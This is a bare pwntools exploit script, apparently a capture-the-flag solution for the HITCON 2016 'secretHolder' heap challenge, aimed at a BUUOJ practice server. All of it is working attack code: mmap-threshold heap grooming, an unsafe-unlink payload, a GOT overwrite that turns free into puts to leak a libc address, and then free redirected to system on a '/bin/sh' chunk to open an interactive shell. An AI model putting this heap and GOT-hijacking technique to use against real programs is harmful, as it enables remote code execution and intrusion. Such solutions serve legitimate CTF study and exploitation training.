from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './secretHolder_hitcon_2016'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',29085) if argv[1]=='r' else process(binary)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(type,content='a'):
	sla('Renew secret\n','1')
	sla('Huge secret\n',str(type))
	sa(': \n',content)
def delete(type):
	sla('Renew secret\n','2')
	sla('Huge secret\n',str(type))
def edit(type,content):
	sla('Renew secret\n','3')
	sla('Huge secret',str(type))
	sa(': \n',content)

add(1)
add(2)
delete(1)
delete(2)
add(3)
delete(3) # mmap threshold +++
add(3) # brk()
delete(1)
add(1) # small <-> huge
add(2)

small = 0x6020b0
fd = small-0x18
bk = small-0x10
payload = flat(0,0x21,fd,bk,0x20,0x90,'a'*0x80)
payload += flat(0,0x21,'a'*0x10,0,0x21)
edit(3,payload)
delete(2)

# ?,big,huge,small,big_flag,huge_flag,small_flag
payload = flat(0,elf.got['atoi'],elf.got['puts'],elf.got['free']) + p32(1)*3
edit(1,payload)
edit(1,p64(elf.plt['puts'])) # free -> puts
delete(2)
atoi = uu64(r(6))
system,binsh = ret2libc(atoi,'atoi')
edit(1,p64(system))
add(2,'/bin/sh\x00')
delete(2)
# end

itr()